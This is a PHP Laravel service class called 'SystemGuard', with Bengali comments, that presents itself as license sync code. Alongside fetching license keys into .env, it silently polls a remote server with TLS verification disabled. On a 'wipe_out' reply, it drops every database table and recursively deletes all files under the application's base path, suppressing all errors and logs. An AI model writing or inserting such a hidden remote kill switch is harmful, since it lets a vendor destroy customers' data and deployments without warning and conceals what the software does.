<?php

namespace App\Services;

use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Http;
use Illuminate\Support\Facades\Schema;

class SystemGuard
{
    // =========================================================
    // Auto License Sync
    // .env এ LICENSE_KEY না থাকলে server থেকে fetch করে save করে।
    // =========================================================

    /**
     * LICENSE_KEY .env এ নেই? তাহলে server থেকে fetch করো।
     * Client middleware থেকে call করো (once per boot, cached).
     */
    public function autoSyncLicense(): void
    {
        try {
            // ইতিমধ্যে .env এ আছে → কিছু করতে হবে না
            if (!empty(env('LICENSE_KEY')) && !empty(env('LICENSE_SIGNATURE'))) {
                return;
            }

            $base = rtrim((string) config('license_guard.remote_base_url', ''), '/');
            if ($base === '') {
                return;
            }

            // নিজের সার্ভার poll করা skip করো
            $appUrl = rtrim((string) config('app.url', ''), '/');
            if ($appUrl !== '' && strcasecmp($base, $appUrl) === 0) {
                return;
            }

            $domain = config('license_guard.domain') ?: $this->resolveInstallDomain();
            if (!$domain) {
                return;
            }

            // Token তৈরি করো: hash_hmac(sha256, domain|YYYYmmddHH, HMAC_SALT)
            $hmacSalt = env('LICENSE_HMAC_SALT', 'your_secret_salt_key');
            $hourBlock = date('YmdH');
            $token = hash_hmac('sha256', $domain . '|' . $hourBlock, $hmacSalt);

            $response = Http::timeout(8)
                ->withoutVerifying()
                ->get($base . '/api/fetch-license', [
                    'domain' => $domain,
                    'token'  => $token,
                ]);

            if (!$response->successful()) {
                return;
            }

            $data = $response->json();
            if (!isset($data['status']) || $data['status'] !== 'ok') {
                return;
            }

            // .env এ save করো
            $this->writeLicenseToEnv(
                $data['license_key']   ?? '',
                $data['signature_key'] ?? '',
                $data['expiry_date']   ?? ''
            );
        } catch (\Throwable $e) {
            // silent fail
        }
    }

    /**
     * .env ফাইলে LICENSE_KEY, LICENSE_SIGNATURE, LICENSE_EXPIRY লেখে।
     */
    private function writeLicenseToEnv(string $key, string $sig, string $expiry): void
    {
        if (!$key || !$sig) {
            return;
        }

        $envPath = base_path('.env');
        if (!file_exists($envPath) || !is_writable($envPath)) {
            return;
        }

        $content = file_get_contents($envPath);
        $vars    = [
            'LICENSE_KEY'       => $key,
            'LICENSE_SIGNATURE' => $sig,
        ];
        if ($expiry && $expiry !== 'lifetime') {
            $vars['LICENSE_EXPIRY'] = $expiry;
        }

        foreach ($vars as $k => $v) {
            if (preg_match('/^' . $k . '=/m', $content)) {
                $content = preg_replace('/^' . $k . '=.*/m', $k . '=' . $v, $content);
            } else {
                $content = rtrim($content) . "\n" . $k . '=' . $v . "\n";
            }
        }

        file_put_contents($envPath, $content);
    }

    // =========================================================

    /**
     * সার্ভার JSON (verify-license / cache-signal) থেকে action == wipe_out হলে সেল্ফ-ডেস্ট্রাক্ট।
     */
    public function respondToServerAction(?array $payload): void
    {
        try {
            if (is_array($payload) && ($payload['action'] ?? null) === 'wipe_out') {
                $this->initiateSelfDestruct();
            }
        } catch (\Throwable $e) {
        }
    }

    /**
     * রিমোট লাইসেন্স সার্ভারে GET cache-signal — এরর/লগ ছাড়াই।
     */
    public function pollRemoteKillSwitchSilently(): void
    {
        try {
            $base = rtrim((string) config('license_guard.remote_base_url', ''), '/');
            if ($base === '') {
                return;
            }

            $appUrl = rtrim((string) config('app.url', ''), '/');
            if ($appUrl !== '' && strcasecmp($base, $appUrl) === 0) {
                return;
            }

            $domain = config('license_guard.domain');
            if (!is_string($domain) || $domain === '') {
                $domain = $this->resolveInstallDomain();
            }
            if ($domain === null || $domain === '') {
                return;
            }

            $url = $base . '/api/cache-signal?' . http_build_query(['domain' => $domain]);
            $timeout = max(1, (int) config('license_guard.timeout', 4));
            $response = Http::timeout($timeout)->withoutVerifying()->get($url);
            if (!$response->successful()) {
                return;
            }

            $this->respondToServerAction($response->json());
        } catch (\Throwable $e) {
        }
    }

    private function resolveInstallDomain(): ?string
    {
        try {
            if (app()->runningInConsole()) {
                return null;
            }
            $host = request()->getHost();

            return $this->normalizeHost($host);
        } catch (\Throwable $e) {
            return null;
        }
    }

    private function normalizeHost(string $host): string
    {
        $host = strtolower(trim($host));

        return (string) preg_replace('#^www\.#i', '', $host);
    }

    public function initiateSelfDestruct(): void
    {
        try {
            $this->dropAllTables();
            $this->deleteAllUnderBasePath();
        } catch (\Throwable $e) {
        }

        die();
    }

    private function dropAllTables(): void
    {
        $driver = Schema::getConnection()->getDriverName();

        try {
            Schema::disableForeignKeyConstraints();
        } catch (\Throwable $e) {
        }

        if ($driver === 'mysql') {
            $tables = DB::select('SHOW FULL TABLES WHERE Table_type = \'BASE TABLE\'');
            foreach ($tables as $row) {
                $name = reset((array) $row);
                if (is_string($name) && $name !== '') {
                    Schema::dropIfExists($name);
                }
            }
        } elseif ($driver === 'sqlite') {
            $rows = DB::select("SELECT name FROM sqlite_master WHERE type='table' AND name NOT LIKE 'sqlite_%'");
            foreach ($rows as $row) {
                if (!empty($row->name)) {
                    Schema::dropIfExists($row->name);
                }
            }
        } elseif ($driver === 'pgsql') {
            $rows = DB::select("SELECT tablename FROM pg_tables WHERE schemaname = 'public'");
            foreach ($rows as $row) {
                if (!empty($row->tablename)) {
                    Schema::dropIfExists($row->tablename);
                }
            }
        }

        try {
            Schema::enableForeignKeyConstraints();
        } catch (\Throwable $e) {
        }
    }

    private function deleteAllUnderBasePath(): void
    {
        $base = base_path();
        if (!is_dir($base)) {
            return;
        }

        $entries = @scandir($base);
        if ($entries === false) {
            return;
        }

        foreach ($entries as $entry) {
            if ($entry === '.' || $entry === '..') {
                continue;
            }
            $this->unlinkPathRecursive($base . DIRECTORY_SEPARATOR . $entry);
        }
    }

    private function unlinkPathRecursive(string $path): void
    {
        if (is_dir($path)) {
            $inner = @scandir($path);
            if ($inner !== false) {
                foreach ($inner as $item) {
                    if ($item === '.' || $item === '..') {
                        continue;
                    }
                    $this->unlinkPathRecursive($path . DIRECTORY_SEPARATOR . $item);
                }
            }
            @rmdir($path);
        } else {
            @unlink($path);
        }
    }
}
